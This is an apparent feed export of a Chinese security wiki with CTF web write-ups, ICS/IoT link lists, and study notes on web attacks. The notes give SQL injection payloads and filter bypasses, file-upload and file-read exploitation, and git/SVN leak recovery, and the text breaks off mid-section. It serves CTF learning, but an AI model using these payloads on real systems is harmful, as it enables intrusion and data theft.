title="Simple_SSTI_2"></a>Simple_SSTI_2</h4><ul><li>解题思路：这个源码没提示了，那就先试试上一道题的吧。<br>flag=4依然能执行，漏洞还在这里。<br>收集到了专门的工具：tplmap，相当好用。</li></ul><h4 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h4><ul><li>解题思路：这个考点还挺多，一个是上传绕过（py在黑名单里但是py3不在），然后是上传py文件让服务器执行并返回想要的内容(os.system(‘ls’))。以及如何用python获取上一级目录内文件（os.system(‘cat ../flag’)）。</li></ul><h4 id="game1"><a href="#game1" class="headerlink" title="game1"></a>game1</h4><ul><li>解题思路：把发出去的包头两个传送分数的值（score sign）改一下就可以了，刚入门的时候做过这道题，那时候居然没发现是base64这里有加了个zm，还是年轻。</li></ul><h4 id="社工-伪造"><a href="#社工-伪造" class="headerlink" title="社工_伪造"></a>社工_伪造</h4><ul><li>解题思路：登录的帐号会共享QQ的头像ID，通过小美签名找到男朋友QQ，拿到头像，手动改自己QQ的头像，ID似乎不需要改（不过我改了），这题真好玩。<br>以及有勇士尝试了能不能直接改包，看来是不行。<br>（如果直接用男朋友QQ登录，会提示：你可真是个小天才）</li></ul><h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><ul><li>解题思路：source标题提示，F12看一眼页面源码，有加密的flag（不是单纯的B64），另一个提示是tig，其实是暗示了git文件泄漏。上脚本查泄漏，git reflog恢复commit记录，git show [commit_id]看修改内容。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Web-18&quot;&gt;&lt;a href=&quot;#Web-18&quot; class=&quot;headerlink&quot; title=&quot;Web 18&quot;&gt;&lt;/a&gt;Web 18&lt;/h4&gt;&lt;p&gt;提示：题目刷新几次后有提示，需要计算数值并post value。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;考点：爬虫复习、</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="121 Web" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"/>
    
    
    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
    
    <category term="WriteUp" scheme="https://tsunamori.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>CTF_IoT</title>
    <link href="https://tsunamori.github.io/wiki/CTF_IoT/"/>
    <id>https://tsunamori.github.io/wiki/CTF_IoT/</id>
    <published>2021-04-29T22:34:18.000Z</published>
    <updated>2021-06-17T14:43:08.361Z</updated>
    
    <content type="html"><![CDATA[<h4 id="stm32"><a href="#stm32" class="headerlink" title="stm32"></a>stm32</h4><p><a href="https://www.anquanke.com/post/id/229321">https://www.anquanke.com/post/id/229321</a><br><a href="https://www.anquanke.com/post/id/231440">https://www.anquanke.com/post/id/231440</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;stm32&quot;&gt;&lt;a href=&quot;#stm32&quot; class=&quot;headerlink&quot; title=&quot;stm32&quot;&gt;&lt;/a&gt;stm32&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/229321&quot;&gt;https://</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="128 IoT" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/128-IoT/"/>
    
    
    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ICS_CTF</title>
    <link href="https://tsunamori.github.io/wiki/CTF_ICS/"/>
    <id>https://tsunamori.github.io/wiki/CTF_ICS/</id>
    <published>2021-04-29T20:05:16.000Z</published>
    <updated>2021-06-17T14:43:08.361Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Modbus-赛题"><a href="#Modbus-赛题" class="headerlink" title="Modbus 赛题"></a>Modbus 赛题</h4><p><a href="https://www.anquanke.com/post/id/185513">https://www.anquanke.com/post/id/185513</a></p><h3 id="工控安全CTF-工具"><a href="#工控安全CTF-工具" class="headerlink" title="工控安全CTF 工具"></a>工控安全CTF 工具</h3><ol><li>网络数据包处理脚本 <a href="https://github.com/NewBee119/ctf_ics_traffic">https://github.com/NewBee119/ctf_ics_traffic</a></li><li>Modbus 脚本 <a href="https://github.com/arnaudsoullie/funwithmodbus0x5a">https://github.com/arnaudsoullie/funwithmodbus0x5a</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Modbus-赛题&quot;&gt;&lt;a href=&quot;#Modbus-赛题&quot; class=&quot;headerlink&quot; title=&quot;Modbus 赛题&quot;&gt;&lt;/a&gt;Modbus 赛题&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="128 ICS" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/128-ICS/"/>
    
    
    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>车联网安全</title>
    <link href="https://tsunamori.github.io/wiki/%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    <id>https://tsunamori.github.io/wiki/%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/</id>
    <published>2021-04-28T21:50:20.000Z</published>
    <updated>2021-06-17T14:43:08.365Z</updated>
    
    <content type="html"><![CDATA[<ol><li>初识智能网联汽车安全 <a href="https://www.anquanke.com/post/id/230212">https://www.anquanke.com/post/id/230212</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;初识智能网联汽车安全 &lt;a href=&quot;https://www.anquanke.com/post/id/230212&quot;&gt;https://www.anquanke.com/post/id/230212&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</summary>
      
    
    
    
    <category term="500 IoT security" scheme="https://tsunamori.github.io/categories/500-IoT-security/"/>
    
    <category term="510 Automotive security" scheme="https://tsunamori.github.io/categories/500-IoT-security/510-Automotive-security/"/>
    
    
    <category term="IoT" scheme="https://tsunamori.github.io/tags/IoT/"/>
    
  </entry>
  
  <entry>
    <title>工控安全</title>
    <link href="https://tsunamori.github.io/wiki/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/"/>
    <id>https://tsunamori.github.io/wiki/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/</id>
    <published>2021-04-28T20:50:51.000Z</published>
    <updated>2021-07-17T11:21:26.923Z</updated>
    
    <content type="html"><![CDATA[<h4 id="工控安全入门"><a href="#工控安全入门" class="headerlink" title="工控安全入门"></a>工控安全入门</h4><ol><li><p>工控安全从入门到实战<br> （一） <a href="https://www.anquanke.com/post/id/178265">https://www.anquanke.com/post/id/178265</a><br> （二） <a href="https://www.anquanke.com/post/id/178425">https://www.anquanke.com/post/id/178425</a></p></li><li><p>工控安全Wiki <a href="https://www.yuque.com/tidesec/ics">https://www.yuque.com/tidesec/ics</a></p></li><li><p>工控安全协议入门<br> Modbus 协议 <a href="https://www.anquanke.com/post/id/185513">https://www.anquanke.com/post/id/185513</a><br> S7comm 协议 <a href="https://www.anquanke.com/post/id/186099">https://www.anquanke.com/post/id/186099</a></p><pre><code>       https://www.anquanke.com/post/id/186587</code></pre><p> DNP3协议 <a href="https://www.anquanke.com/post/id/187221">https://www.anquanke.com/post/id/187221</a></p></li><li><p>工控安全相关资源（协议数据包等） <a href="https://github.com/w3h/icsmaster">https://github.com/w3h/icsmaster</a></p></li></ol><h4 id="工控安全工具"><a href="#工控安全工具" class="headerlink" title="工控安全工具"></a>工控安全工具</h4><ol><li>ICS windows v2.0 <a href="https://www.anquanke.com/post/id/227645">https://www.anquanke.com/post/id/227645</a> （含工具列表）</li></ol><h4 id="实验室"><a href="#实验室" class="headerlink" title="实验室"></a>实验室</h4><ol><li>工控安全-灯塔实验室 <a href="http://plcscan.org/blog/category/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/">http://plcscan.org/blog/category/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/</a></li><li>工控安全-Tide安全团队 <a href="http://www.tidesec.net/">http://www.tidesec.net/</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;工控安全入门&quot;&gt;&lt;a href=&quot;#工控安全入门&quot; class=&quot;headerlink&quot; title=&quot;工控安全入门&quot;&gt;&lt;/a&gt;工控安全入门&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;工控安全从入门到实战&lt;br&gt; （一） &lt;a href=&quot;https://www.anqua</summary>
      
    
    
    
    <category term="400 ICS security" scheme="https://tsunamori.github.io/categories/400-ICS-security/"/>
    
    
    <category term="ICS" scheme="https://tsunamori.github.io/tags/ICS/"/>
    
  </entry>
  
  <entry>
    <title>近源渗透</title>
    <link href="https://tsunamori.github.io/wiki/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/"/>
    <id>https://tsunamori.github.io/wiki/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/</id>
    <published>2021-04-28T20:05:26.000Z</published>
    <updated>2021-06-17T14:43:08.365Z</updated>
    
    <content type="html"><![CDATA[<ol><li>红蓝对抗中的近源渗透 <a href="https://security.tencent.com/index.php/blog/msg/167">https://security.tencent.com/index.php/blog/msg/167</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;红蓝对抗中的近源渗透 &lt;a href=&quot;https://security.tencent.com/index.php/blog/msg/167&quot;&gt;https://security.tencent.com/index.php/blog/msg/167&lt;/a&gt;&lt;/l</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
    
    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
    
    
    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
    
  </entry>
  
  <entry>
    <title>0 to 1 the road of CTFer 第一章 Web入门</title>
    <link href="https://tsunamori.github.io/wiki/Notes_0-to-1-the-road-of-CTFer_1/"/>
    <id>https://tsunamori.github.io/wiki/Notes_0-to-1-the-road-of-CTFer_1/</id>
    <published>2021-04-26T18:49:07.000Z</published>
    <updated>2021-06-17T14:43:08.365Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一章-Web入门"><a href="#第一章-Web入门" class="headerlink" title="第一章 Web入门"></a>第一章 Web入门</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="敏感信息泄漏"><a href="#敏感信息泄漏" class="headerlink" title="敏感信息泄漏"></a>敏感信息泄漏</h3><h4 id="git泄漏"><a href="#git泄漏" class="headerlink" title="git泄漏"></a>git泄漏</h4><ol><li>常规git泄漏：flag在源码内，可直接利用工具或脚本获取。</li><li>git回滚：flag被修改，但依然保存在commit记录里。<ul><li>利用<code>git reset --hard [版本号]</code>获取flag。</li><li>更简单的方法是通过<code>git log-stat</code>查看每个commit修改了哪些文件，再用<code>git diff HEAD [commit-id]</code>比较当前版本和想看的commit之间的变化。</li></ul></li><li>git分支：命令<code>git reflog</code>查看分支间切换的记录。从原url下载分支内容并恢复（目前的恢复分支记录需要下载分支HEAD并修改GitHacker.py代码实现自动恢复分支，先简单记录下来，后续看是否有其它更简单的方式。）</li><li>git stash：stash是对当前工作的“保存”，以备后续恢复。<code>git stash list</code>查看保存的列表，<code>git stash pop</code>恢复工作现场，<code>git stash show</code>显示做了哪些改动。</li><li>git index：index是暂存区，用于通过git add .命令暂存新建文件等待commit。使用<code>git checkout-index</code>命令恢复文件。</li><li>git泄漏的其他利用方式：泄漏的git中也可能有其他有用的信息。<ul><li>.git/config文件夹中可能含有access_token信息，从而访问该用户的其它仓库。</li></ul></li></ol><h4 id="SVN泄漏"><a href="#SVN泄漏" class="headerlink" title="SVN泄漏"></a>SVN泄漏</h4><p>SVN是源代码版本管理软件，如果存在泄漏，可以利用.svn/entries或wc.db文件获取服务器源码等信息。</p><ul><li><a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></li><li>Seay-svn（Win）</li></ul><h4 id="HG泄漏"><a href="#HG泄漏" class="headerlink" title="HG泄漏"></a>HG泄漏</h4><p>.hg隐藏文件中包含代码和分支修改记录等信息。</p><ul><li><a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>CTF线上赛往往会有重定向的问题，例如，只要访问<code>.git</code>便会返回403,此时访问<code>.git/config</code>，如果有文件内容返回，说明存在git泄漏，反之，一般不存在。而在SVN泄漏中，一般是在entries中爬取源代码，但有时会出现entries为空的情况，这时注意wc.db文件存在与否，便可通过其中的checksum在pristine文件夹中获取源代码。</p><h3 id="敏感备份文件"><a href="#敏感备份文件" class="headerlink" title="敏感备份文件"></a>敏感备份文件</h3><h4 id="gedit备份文件"><a href="#gedit备份文件" class="headerlink" title="gedit备份文件"></a>gedit备份文件</h4><p>在Linux下，用gedit编辑器保存文件后，当前目录下会生成一个<code>[文件名]~</code>的备份文件，访问这个文件即可获得文件内容。</p><h4 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h4><p>vim在意外退出时会生成一个备份文件，文件名格式为<code>.filename.swp</code>，再次生成备份文件时则为<code>.filename.swo</code>，第三次为<code>.filename.swn</code>，以此类推。恢复备份的办法是，先在当前目录下创建一个flag文件，再使用<code>vim-r flag</code>，即可恢复.flag.swp。</p><h4 id="常规文件"><a href="#常规文件" class="headerlink" title="常规文件"></a>常规文件</h4><p>主要靠丰富字典。(dirsearch+自己收集字典)</p><ul><li>phpinfo()</li><li>备份文件后缀<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">back.rar</span><br><span class="line">back.tar</span><br><span class="line">back.tar.gz</span><br><span class="line">back.zip</span><br><span class="line">backup.rar</span><br><span class="line">backup.tar</span><br><span class="line">backup.tar.gz</span><br><span class="line">backup.zip</span><br><span class="line">temp.rar</span><br><span class="line">temp.tar</span><br><span class="line">temp.tar.gz</span><br><span class="line">temp.zip</span><br><span class="line">web.rar</span><br><span class="line">web.tar</span><br><span class="line">web.tar.gz</span><br><span class="line">web.zip</span><br><span class="line">website.rar</span><br><span class="line">website.tar</span><br><span class="line">website.tar.gz</span><br><span class="line">website.zip</span><br><span class="line">www.rar</span><br><span class="line">www.tar</span><br><span class="line">www.tar.gz</span><br><span class="line">www.zip</span><br><span class="line">wwwroot.rar</span><br><span class="line">wwwroot.tar</span><br><span class="line">wwwroot.tar.gz</span><br><span class="line">wwwroot.zip</span><br><span class="line">index.php.bak</span><br></pre></td></tr></table></figure></li></ul><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>线上赛过程中，出题人往往会在线运维题目，有时会导致swp备份文件的生成。所以读者在比赛过程中可以编写实时监控脚本，对题目服务进行监控。</p><h3 id="Banner识别"><a href="#Banner识别" class="headerlink" title="Banner识别"></a>Banner识别</h3><p>在线上赛中，网站的Banner对解题有着十分重要的作用，选手往往可以通过Banner信息来获得解题思路。<br>如得知网站是用ThinkPHP的Web框架编写时，我们可以尝试ThinkPHP框架的相关历史漏洞。或者得知这个网站是Windows服务器，那么我们在测试上传漏洞时可以根据Windows的特性进行尝试。</p><h4 id="自行收集指纹库"><a href="#自行收集指纹库" class="headerlink" title="自行收集指纹库"></a>自行收集指纹库</h4><ul><li>Github CMS指纹库</li><li>扫描器识别</li></ul><h4 id="使用已有工具"><a href="#使用已有工具" class="headerlink" title="使用已有工具"></a>使用已有工具</h4><ul><li>Wappalyzer（pip install python-Wappalyzer）：在data目录下，apps.json是其规则库，读者可以根据自己需求自由添加。</li></ul><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>除了以上两种识别方式，我们还可以通过随意输入一些URL，观察404和302跳转页面中是否包含CMS及版本号。</p><h2 id="CTF中的SQL注入"><a href="#CTF中的SQL注入" class="headerlink" title="CTF中的SQL注入"></a>CTF中的SQL注入</h2><h3 id="SQL注入（mysql）"><a href="#SQL注入（mysql）" class="headerlink" title="SQL注入（mysql）"></a>SQL注入（mysql）</h3><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>test.php?id=2 -&gt; true。返回记录。<br>test.php?id=3-1 -&gt; true，返回id=2的记录。<br>说明mysql对3-1进行了计算，从数字运算这个特征可以判断该注入点为数字型注入，输入点$_GET[‘id’]附近没有引号包裹，可以直接输入SQL查询语句。</p><p>mysql查询出两行记录（union select联合查询注入）但PHP源码限制只能显示一行记录的办法：<br>    1. 在原有数据后面加上<code>limit 1,1</code>参数，显示查询结果的第二条记录。<br>    1. 指定id=-1或一个很大的值，使第一条数据无法被查询到。（常用）</p><h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>与数字型注入相比，只是在GET参数输入的地方包裹了单引号（少部分情况为双引号）让其变成字符串。<br>在MySQL中，等号两边如果类型不一致则会发生强制转换，当数字和字符串数据比较时，字符串将被转换为数字再进行比较。<br>test.php?id=3-2，无返回结果，证明注入点不是数字型。继续尝试test.php?id=2a，返回id=2的结果，证明存在字符型注入。</p><pre><code>1. 尝试使用单引号闭合前面的单引号，（插入查询语句），再用`--%20`或`%23`注释后面的语句，注意在URL框输入时，`-- `和`#`以及`&#39;&#39;`要进行URL编码。1. 除了注释，也可以使用单引号来闭合后面的单引号，eg: test.php?id=2&#39;union select xxx &#39;</code></pre><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>test.php?id=1’and’f’=’a’，猜中则返回id=1内容<br>更快的方法为 test.php?id=1’and’f’&lt;’n’，二分法。<br>如何获取每一位字符？利用mysql的substring(),mid(),substr()等。</p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>php?id=1’or sleep(10)</p><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>mysql会将语句执行后的报错信息输出。<br>updatexml在执行时，第二个参数应该为合法的XPATH路径，否则会在引发报错时输出传入的参数。<br>id=’1’ or updatexml(1,concat(0x7e,(select pwd from wp_user)),1)<br>updatexml()报错注入，ref: <a href="https://blog.csdn.net/qq_37873738/article/details/88042610">https://blog.csdn.net/qq_37873738/article/details/88042610</a></p><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>当目标开启多语句执行时，可以采用多语句执行的方式修改数据库结构和数据。</p><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><h4 id="注入点在select-expr"><a href="#注入点在select-expr" class="headerlink" title="注入点在select_expr"></a>注入点在select_expr</h4><p>AS别名：id=(select%20pwd%20from%20wp_user)%20as%20title</p><h4 id="注入点在table-reference"><a href="#注入点在table-reference" class="headerlink" title="注入点在table_reference"></a>注入点在table_reference</h4><p>仍可以用别名取出数据：SELECT title FROM (SELECT pwd AS title FROM wp_user)x;</p><p>在该两处的注入，如果注入点有反引号包裹，那么需要先闭合反引号。</p><h4 id="注入点在WHERE或HAVING后"><a href="#注入点在WHERE或HAVING后" class="headerlink" title="注入点在WHERE或HAVING后"></a>注入点在WHERE或HAVING后</h4><p>代码：<code>$res = mysqli_query($conn, &quot;SELECT title FROM wp_news WHERE id = $&#123;_GET[id]&#125;&quot;);</code><br>现实中最常遇到的情况，要先判断有无引号包裹，再闭合前面可能存在的括号，即可进行注入来获取数据。</p><p>注入点在HAVING后的情况与之类似。</p><h4 id="注入点在GROUP-BY或ORDER-BY后"><a href="#注入点在GROUP-BY或ORDER-BY后" class="headerlink" title="注入点在GROUP BY或ORDER BY后"></a>注入点在GROUP BY或ORDER BY后</h4><p>当遇到不是WHERE后的注入点时，先在本地MySQL中进行尝试，看语句后面能加什么，从而判断当前可以注入的位置，进而进行有针对的注入。</p><p>假设代码如下：<code>$res = mysqli_query($conn, &quot;SELECT title FROM wp_news GROUP BY $&#123;_GET[&#39;title&#39;]&#125;&quot;);</code><br>测试可得，title=id desc,(if(1,sleep(1),1))，可以利用时间注入获取数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">事实上只要对输入值进行白名单比对，基本就能防御这种注入。</span><br></pre></td></tr></table></figure><h4 id="注入点在LIMIT后"><a href="#注入点在LIMIT后" class="headerlink" title="注入点在LIMIT后"></a>注入点在LIMIT后</h4><p>该注入比较简单，通过更改数字大小，页面会显示更多或更少的记录数。由于语法限制，LIMIT后只能是数字，在整个SQL语句没有ORDER BY关键字的情况下，可以直接使用UNION注入。另外可以根据SELECT语法，通过加入PROCEDURE来尝试注入（只适用于MySQL 5.6前的版本）</p><h3 id="INSERT注入"><a href="#INSERT注入" class="headerlink" title="INSERT注入"></a>INSERT注入</h3><p>通常注入位于字段名或字段值的地方，且没有回显信息。</p><h4 id="注入点位于tbl-name"><a href="#注入点位于tbl-name" class="headerlink" title="注入点位于tbl_name"></a>注入点位于tbl_name</h4><p>如果能够通过注释符注释后续语句，则可直接插入特定数据到想要的表内，如管理员表。</p><h4 id="注入点位于VALUES"><a href="#注入点位于VALUES" class="headerlink" title="注入点位于VALUES"></a>注入点位于VALUES</h4><h3 id="UPDATE注入"><a href="#UPDATE注入" class="headerlink" title="UPDATE注入"></a>UPDATE注入</h3><h3 id="DELETE注入"><a href="#DELETE注入" class="headerlink" title="DELETE注入"></a>DELETE注入</h3><p>对id参数进行注入时，如果使WHERE后的值变为true，数据就会被删除。为了保证正常数据不会被干扰，通常使用<code>and sleep (1)</code>保证WHERE后的结果返回为false，让语句无法成功执行，后续步骤参考时间盲注。</p><h2 id="注入防御及绕过思路"><a href="#注入防御及绕过思路" class="headerlink" title="注入防御及绕过思路"></a>注入防御及绕过思路</h2><p>其它ref：<a href="https://blog.csdn.net/wy_97/article/details/78085664">https://blog.csdn.net/wy_97/article/details/78085664</a></p><h3 id="关键字替换或匹配拦截"><a href="#关键字替换或匹配拦截" class="headerlink" title="关键字替换或匹配拦截"></a>关键字替换或匹配拦截</h3><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>替代空格的空白符有：<code>%0a, %0b, %0c, %0d, %09, %a0</code>（均为URL编码，%a0在特定字符集才能利用）和<code>/**/</code>组合、括号等。</p><h4 id="将SELECT替换成空"><a href="#将SELECT替换成空" class="headerlink" title="将SELECT替换成空"></a>将SELECT替换成空</h4><p>可以采用嵌套的方式，如SESELECTLECT。</p><h4 id="大小写匹配"><a href="#大小写匹配" class="headerlink" title="大小写匹配"></a>大小写匹配</h4><p>在MySQL中，关键字是不区分大小写的，如果只匹配了SELECT就可以通过大小写混写的方式绕过。</p><h4 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h4><p>正则匹配关键字<code>\bselect\b</code>可以用形如<code>/*!50000select*/</code>的方式绕过。</p><h4 id="替换了单引号或双引号，没有过滤反斜杠"><a href="#替换了单引号或双引号，没有过滤反斜杠" class="headerlink" title="替换了单引号或双引号，没有过滤反斜杠"></a>替换了单引号或双引号，没有过滤反斜杠</h4><p><code>id=&#39;a\&#39; AND title = &#39;OR sleep(1)#&#39;</code><br>反斜杠转义了预置的单引号，实现绕过。</p><h3 id="逃逸引号"><a href="#逃逸引号" class="headerlink" title="逃逸引号"></a>逃逸引号</h3><h4 id="编码解码"><a href="#编码解码" class="headerlink" title="编码解码"></a>编码解码</h4><p>当用户输入待转义函数时，如果数据处于编码状态则引号无法被转义。<br>同样的情况也发生在加密/解密、字符集转换的情况。</p><ul><li>宽字节注入</li></ul><h4 id="意料之外的输入点"><a href="#意料之外的输入点" class="headerlink" title="意料之外的输入点"></a>意料之外的输入点</h4><p>被遗漏的可控点，例如PHP中，上传的文件名、http header、$_SERVER[‘PHP_SELF’] 等变量。</p><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>由于开发者信任数据库中取出的数据是无害的，从而导致二次注入漏洞的出现。</p><ul><li> 用户名为<code>admin&#39;or&#39;1</code></li></ul><h4 id="字符串截断"><a href="#字符串截断" class="headerlink" title="字符串截断"></a>字符串截断</h4><p>在标题、抬头等位置，开发者可能限制其字符不能超过x个字符，超过就会被截断。<br>假如攻击者输入<code>aaaa&#39;</code>，自动转义为<code>aaaa\&#39;</code>，由于长度限制被截取为<code>aaaa\</code>，正好转义预置的单引号，实现注入。</p><h3 id="注入应用"><a href="#注入应用" class="headerlink" title="注入应用"></a>注入应用</h3><ul><li>在有写文件权限的情况下，直接用INTO OUTFILE或DUMPFILE向Web目录写文件，或写文件后结合文件包含漏洞实现代码执行。ref:<a href="https://baijiahao.baidu.com/s?id=1650711425682220792&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1650711425682220792&amp;wfr=spider&amp;for=pc</a></li><li>在有读文件权限的情况下，用load_file()函数读取网站源码和配置信息，获取敏感数据。</li><li>提升权限，绕过登录，添加用户，调整用户权限。</li><li>通过数据，控制如缓存、模板等文件内容来获取权限，或者删除、读取某些关键文件。</li><li>在可以执行多语句的情况下，控制整个数据库，包括控制任意数据、任意字段长度等。</li><li>在SQL Server这类数据库中可以直接执行系统命令。</li></ul><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>实际比赛中，应根据不同的SQL服务器类型查找相关资料，通过fuzz得出被过滤的字符、函数、关键词等，在文档中查找未过滤的替代，完成绕过。</p><ul><li>练习靶场：github-sqli-labs</li></ul><h2 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h2><h3 id="文件读取漏洞常见触发点"><a href="#文件读取漏洞常见触发点" class="headerlink" title="文件读取漏洞常见触发点"></a>文件读取漏洞常见触发点</h3><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><p>有关文件读取的标准函数（审计中重点关注）。<br>包括但不限于：</p><ul><li><code>file_get_contents(),file(),fopen()</code>函数，(及其文件指针操作函数fread(),fgets()等);</li><li>与文件包含相关的函数<code>include(),require(),include_once(),require_once()</code>等;</li><li>通过PHP读文件的执行系统命令：<code>system(),exec()</code>等。<br>PHP扩展中读取文件的函数：</li><li>php-curl扩展</li><li>XML模块XXE</li></ul><p>相关源码阅读：Wrapper和Filter</p><p>PHP文件包含的实际问题：<br>    1. 文件路径前面可控，后面不可控：在较低PHP及容器版本中可以使用<code>\x00</code>截断，对应的URL编码是<code>%00</code>。当服务端存在文件上传功能时，也可以尝试利用zip或phar协议直接进行文件包含执行PHP代码。<br>    1. 文件路径后面可控，前面不可控：通过<code>../</code>进行目录穿越读取文件，但这种情况无法使用Wrapper，如果服务器是利用include等文件包含类的函数，将无法读取PHP文件中的PHP代码。<br>    1. 文件路径中间可控：和第一种相似，但无法利用Wrapper进行文件包含。</p><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><p>漏洞经常出现在框架请求静态资源文件部分，也就是最后读取文件内容的open函数。但直接导致漏洞的原因往往是Python函数的feature被忽略。</p><p>除了Python框架，很多其它涉及文件操作的应用也可能因为滥用open函数、模板的不当渲染导致任意文件读取。</p><h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><ul><li>文件读取函数FileInputStream</li><li>XXE</li><li>JAVA模块所支持的<code>file://</code>协议</li><li>Spring Cloud Config Server 路径穿越与任意文件读取漏洞 CVE-2019-3799, Jenkins 任意文件读取漏洞 CVE-2018-1999002</li></ul><h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><ul><li>通常与Rails框架相关。</li><li>Ruby on Rails 远程代码执行漏洞 CVE-2016-0752，Ruby on Rails 路径穿越与任意文件读取漏洞 CVE-2018-3760，Ruby on Rails 路径穿越与任意文件读取漏洞 CVE-2019-5418</li></ul><h4 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h4><ul><li>通常为模板注入、代码注入等。</li><li>Node.js express 模块任意文件读取漏洞 CVE-2017-14849</li></ul><h3 id="中间件-服务器相关"><a href="#中间件-服务器相关" class="headerlink" title="中间件/服务器相关"></a>中间件/服务器相关</h3><h4 id="Nginx错误配置"><a href="#Nginx错误配置" class="headerlink" 